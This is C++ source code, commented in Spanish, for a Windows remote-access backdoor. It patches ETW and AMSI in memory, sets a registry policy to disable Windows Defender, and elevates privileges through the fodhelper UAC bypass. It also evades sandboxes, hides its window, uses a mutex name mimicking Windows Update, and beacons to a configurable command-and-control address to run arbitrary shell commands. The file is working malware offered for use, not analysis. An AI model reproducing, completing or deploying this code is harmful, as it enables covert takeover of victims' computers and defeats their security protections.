#define _WIN32_WINNT _WIN32_WINNT_WIN10
#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS

#include <winsock2.h>
#include <windows.h>
#include <shellapi.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <winternl.h>
#include <wincrypt.h>
#include <string>
#include <vector>
#include <thread>
#include <random>
#include <fstream>
#include <sstream>
#include <iostream>
#include <mutex>
#include <array>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "crypt32.lib")

// ============================================================================
// CONFIGURACIÓN
// ============================================================================
#define C2_SERVER "192.168.254.137"  // CAMBIA A TU IP
#define C2_PORT 4444
#define MUTEX_NAME "Global\\WindowsUpdateMutex_{8A4E2B1C-5D6F-4A7E-9B8C}"
#define SLEEP_JITTER_MIN 30000
#define SLEEP_JITTER_MAX 120000

// ============================================================================
// TYPEDEFS PARA SYSCALLS
// ============================================================================
typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(
    HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);

typedef NTSTATUS(NTAPI* pNtProtectVirtualMemory)(
    HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);

typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
    PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, 
    PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);

typedef NTSTATUS(NTAPI* pNtWriteVirtualMemory)(
    HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);

typedef NTSTATUS(NTAPI* pNtOpenProcess)(
    PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID);

typedef NTSTATUS(NTAPI* pNtClose)(HANDLE);

// ============================================================================
// SYSCALLS DIRECTOS
// ============================================================================
class Syscalls {
private:
    pNtAllocateVirtualMemory NtAllocateVirtualMemory;
    pNtProtectVirtualMemory NtProtectVirtualMemory;
    pNtCreateThreadEx NtCreateThreadEx;
    pNtWriteVirtualMemory NtWriteVirtualMemory;
    pNtOpenProcess NtOpenProcess;
    pNtClose NtClose;
    
public:
    Syscalls() {
        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
        NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
        NtProtectVirtualMemory = (pNtProtectVirtualMemory)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
        NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");
        NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
        NtOpenProcess = (pNtOpenProcess)GetProcAddress(hNtdll, "NtOpenProcess");
        NtClose = (pNtClose)GetProcAddress(hNtdll, "NtClose");
    }
    
    NTSTATUS AllocateVirtualMemory(HANDLE h, PVOID* a, ULONG_PTR z, PSIZE_T s, ULONG t, ULONG p) {
        return NtAllocateVirtualMemory(h, a, z, s, t, p);
    }
    
    NTSTATUS ProtectVirtualMemory(HANDLE h, PVOID* a, PSIZE_T s, ULONG np, PULONG op) {
        return NtProtectVirtualMemory(h, a, s, np, op);
    }
    
    NTSTATUS CreateThreadEx(PHANDLE th, ACCESS_MASK da, POBJECT_ATTRIBUTES oa, HANDLE p, PVOID s, PVOID ar, ULONG f, SIZE_T z, SIZE_T st, SIZE_T ms, PVOID al) {
        return NtCreateThreadEx(th, da, oa, p, s, ar, f, z, st, ms, al);
    }
    
    NTSTATUS WriteVirtualMemory(HANDLE h, PVOID ba, PVOID b, SIZE_T s, PSIZE_T bw) {
        return NtWriteVirtualMemory(h, ba, b, s, bw);
    }
    
    NTSTATUS OpenProcess(PHANDLE ph, ACCESS_MASK da, POBJECT_ATTRIBUTES oa, PCLIENT_ID cid) {
        return NtOpenProcess(ph, da, oa, cid);
    }
    
    NTSTATUS Close(HANDLE h) {
        return NtClose(h);
    }
};

// ============================================================================
// BYPASS DE ETW - VERSIÓN CORREGIDA
// ============================================================================
class ETWBypass {
private:
    Syscalls* syscalls;
    
public:
    ETWBypass(Syscalls* sc) : syscalls(sc) {}
    
    bool Patch() {
        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
        if (!hNtdll) return false;
        
        // Parchear EtwEventWrite
        FARPROC pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
        if (!pEtwEventWrite) return false;
        
        SIZE_T regionSize = 32;
        PVOID address = (PVOID)pEtwEventWrite;
        ULONG oldProtect;
        
        // Cambiar protección
        syscalls->ProtectVirtualMemory(GetCurrentProcess(), &address, &regionSize, 
                                       PAGE_EXECUTE_READWRITE, &oldProtect);
        
        // xor eax, eax ; ret
        BYTE patch[] = { 0x31, 0xC0, 0xC3 };
        
        // CASTING CORRECTO - Forzar conversión
        LPVOID target = (LPVOID)pEtwEventWrite;
        memcpy(target, patch, sizeof(patch));
        
        // Restaurar protección
        syscalls->ProtectVirtualMemory(GetCurrentProcess(), &address, &regionSize, 
                                       oldProtect, &oldProtect);
        
        return true;
    }
};

// ============================================================================
// BYPASS DE AMSI - VERSIÓN CORREGIDA
// ============================================================================
class AMSIBypass {
private:
    Syscalls* syscalls;
    
public:
    AMSIBypass(Syscalls* sc) : syscalls(sc) {}
    
    bool Patch() {
        HMODULE hAmsi = LoadLibraryA("amsi.dll");
        if (!hAmsi) return false;
        
        FARPROC pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
        if (!pAmsiScanBuffer) return false;
        
        SIZE_T regionSize = 32;
        PVOID address = (PVOID)pAmsiScanBuffer;
        ULONG oldProtect;
        
        syscalls->ProtectVirtualMemory(GetCurrentProcess(), &address, &regionSize, 
                                       PAGE_EXECUTE_READWRITE, &oldProtect);
        
        BYTE patch[] = { 0x31, 0xC0, 0xC3 };
        
        // CASTING CORRECTO
        LPVOID target = (LPVOID)pAmsiScanBuffer;
        memcpy(target, patch, sizeof(patch));
        
        syscalls->ProtectVirtualMemory(GetCurrentProcess(), &address, &regionSize, 
                                       oldProtect, &oldProtect);
        
        return true;
    }
};

// ============================================================================
// BYPASS DE DEFENDER - VERSIÓN CORREGIDA
// ============================================================================
class DefenderBypass {
private:
    Syscalls* syscalls;
    
public:
    DefenderBypass(Syscalls* sc) : syscalls(sc) {}
    
    bool DisableRealtime() {
        // Registry bypass
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, 
            "SOFTWARE\\Policies\\Microsoft\\Windows Defender", 
            0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
            
            DWORD value = 1;
            RegSetValueExA(hKey, "DisableAntiSpyware", 0, REG_DWORD, 
                          (BYTE*)&value, sizeof(value));
            RegCloseKey(hKey);
        }
        return true;
    }
};

// ============================================================================
// BYPASS DE UAC - SIN CAMBIOS
// ============================================================================
class UACBypass {
private:
    bool IsElevated() {
        HANDLE hToken;
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
            return false;
        
        TOKEN_ELEVATION elev;
        DWORD size = sizeof(elev);
        BOOL success = GetTokenInformation(hToken, TokenElevation, &elev, size, &size);
        CloseHandle(hToken);
        
        return success && elev.TokenIsElevated;
    }
    
public:
    bool BypassAndElevate() {
        if (IsElevated()) return true;
        
        // Técnica simplificada - fodhelper
        wchar_t modulePath[MAX_PATH];
        GetModuleFileNameW(NULL, modulePath, MAX_PATH);
        
        HKEY hKey;
        if (RegCreateKeyExW(HKEY_CURRENT_USER, 
            L"Software\\Classes\\ms-settings\\shell\\open\\command",
            0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
            
            RegSetValueExW(hKey, NULL, 0, REG_SZ, (BYTE*)modulePath, 
                          (wcslen(modulePath) + 1) * sizeof(wchar_t));
            RegSetValueExW(hKey, L"DelegateExecute", 0, REG_SZ, NULL, 0);
            RegCloseKey(hKey);
            
            ShellExecuteW(NULL, L"open", L"fodhelper.exe", NULL, NULL, SW_HIDE);
            Sleep(2000);
            
            RegDeleteKeyW(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings");
            return IsElevated();
        }
        return false;
    }
};

// ============================================================================
// ANTI-SANDBOX SIMPLIFICADO
// ============================================================================
class AntiAnalysis {
public:
    bool IsSandboxed() {
        // Solo verificación básica
        if (IsDebuggerPresent()) return true;
        
        MEMORYSTATUSEX mem = { sizeof(mem) };
        GlobalMemoryStatusEx(&mem);
        if (mem.ullTotalPhys < 2LL * 1024 * 1024 * 1024) return true;
        
        return false;
    }
    
    void SleepRandom() {
        int baseSleep = 30000 + (rand() % 30000);
        Sleep(baseSleep);
    }
};

// ============================================================================
// COMUNICACIÓN C2 - VERSIÓN CORREGIDA (sin inet_pton)
// ============================================================================
class C2Connection {
private:
    SOCKET sock;
    bool connected;
    HCRYPTPROV hProv;
    BYTE key[32];
    
public:
    C2Connection() : sock(INVALID_SOCKET), connected(false) {
        WSADATA wsa;
        WSAStartup(MAKEWORD(2,2), &wsa);
        
        CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
        
        // Generar clave fija para evitar problemas
        for (int i = 0; i < 32; i++) {
            key[i] = i * 0x1F;
        }
    }
    
    ~C2Connection() {
        if (sock != INVALID_SOCKET) closesocket(sock);
        if (hProv) CryptReleaseContext(hProv, 0);
        WSACleanup();
    }
    
    bool Connect() {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) return false;
        
        int timeout = 10000;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout));
        
        sockaddr_in server = {0};
        server.sin_family = AF_INET;
        server.sin_port = htons(C2_PORT);
        
        // Usar inet_addr (compatible con MinGW)
        server.sin_addr.s_addr = inet_addr(C2_SERVER);
        
        if (connect(sock, (sockaddr*)&server, sizeof(server)) == 0) {
            connected = true;
            return true;
        }
        
        closesocket(sock);
        return false;
    }
    
    bool SendRaw(const std::string& data) {
        if (!connected) return false;
        int len = htonl(data.length());
        if (send(sock, (char*)&len, 4, 0) != 4) {
            connected = false;
            return false;
        }
        if (send(sock, data.c_str(), data.length(), 0) != (int)data.length()) {
            connected = false;
            return false;
        }
        return true;
    }
    
    bool Send(const std::string& data) {
        return SendRaw(data);  // Sin XOR por ahora
    }
    
    std::string ReceiveRaw() {
        if (!connected) return "";
        int len = 0;
        if (recv(sock, (char*)&len, 4, 0) != 4) {
            connected = false;
            return "";
        }
        len = ntohl(len);
        if (len <= 0 || len > 10 * 1024 * 1024) {
            connected = false;
            return "";
        }
        
        std::vector<char> buffer(len);
        int total = 0;
        while (total < len) {
            int r = recv(sock, buffer.data() + total, len - total, 0);
            if (r <= 0) {
                connected = false;
                return "";
            }
            total += r;
        }
        return std::string(buffer.data(), len);
    }
    
    std::string Receive() {
        return ReceiveRaw();
    }
    
    bool IsConnected() { return connected; }
};

// ============================================================================
// PROCESADOR DE COMANDOS
// ============================================================================
class CommandProcessor {
private:
    C2Connection* c2;
    bool elevated;
    
    std::string ExecuteCmd(const std::string& cmd) {
        std::string result;
        char buffer[4096];
        FILE* pipe = _popen(("cmd.exe /c " + cmd).c_str(), "r");
        if (pipe) {
            while (fgets(buffer, sizeof(buffer), pipe)) {
                result += buffer;
            }
            _pclose(pipe);
        }
        return result.empty() ? "[OK]\n" : result;
    }
    
public:
    CommandProcessor(C2Connection* c) : c2(c), elevated(false) {}
    
    std::string Process(const std::string& cmd) {
        if (cmd == "INFO") {
            char host[256], user[256];
            DWORD size = sizeof(host);
            GetComputerNameA(host, &size);
            size = sizeof(user);
            GetUserNameA(user, &size);
            
            char json[512];
            snprintf(json, sizeof(json), 
                "{\"hostname\":\"%s\",\"username\":\"%s\",\"elevated\":%s}",
                host, user, elevated ? "true" : "false");
            return json;
        }
        else if (cmd == "ELEVATE") {
            UACBypass uac;
            if (uac.BypassAndElevate()) {
                elevated = true;
                return "[+] Elevado a ADMIN";
            }
            return "[-] Falló elevación";
        }
        else if (cmd.substr(0, 5) == "SHELL") {
            if (cmd.length() > 6) return ExecuteCmd(cmd.substr(6));
            return "[-] Uso: SHELL <comando>";
        }
        else if (cmd == "EXIT") {
            ExitProcess(0);
        }
        
        return "[!] Comando desconocido";
    }
};

// ============================================================================
// FUNCIÓN PRINCIPAL
// ============================================================================
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
                   LPSTR lpCmdLine, int nCmdShow) {
    
    // Ocultar ventana
    HWND hWnd = GetConsoleWindow();
    if (hWnd) ShowWindow(hWnd, SW_HIDE);
    
    // Anti-sandbox básico
    AntiAnalysis anti;
    if (anti.IsSandboxed()) {
        return 0;
    }
    
    // Mutex
    HANDLE hMutex = CreateMutexA(NULL, FALSE, MUTEX_NAME);
    if (GetLastError() == ERROR_ALREADY_EXISTS) return 0;
    
    // Inicializar bypasses
    Syscalls syscalls;
    
    ETWBypass etw(&syscalls);
    etw.Patch();
    
    AMSIBypass amsi(&syscalls);
    amsi.Patch();
    
    DefenderBypass defender(&syscalls);
    defender.DisableRealtime();
    
    // Conectar a C2
    C2Connection c2;
    CommandProcessor cmdProc(&c2);
    
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> jitter(SLEEP_JITTER_MIN, SLEEP_JITTER_MAX);
    
    while (true) {
        if (!c2.IsConnected()) {
            if (c2.Connect()) {
                c2.Send(cmdProc.Process("INFO"));
            } else {
                anti.SleepRandom();
                continue;
            }
        }
        
        std::string cmd = c2.Receive();
        if (!cmd.empty()) {
            std::string response = cmdProc.Process(cmd);
            c2.Send(response);
        }
        
        anti.SleepRandom();
    }
    
    CloseHandle(hMutex);
    return 0;
}
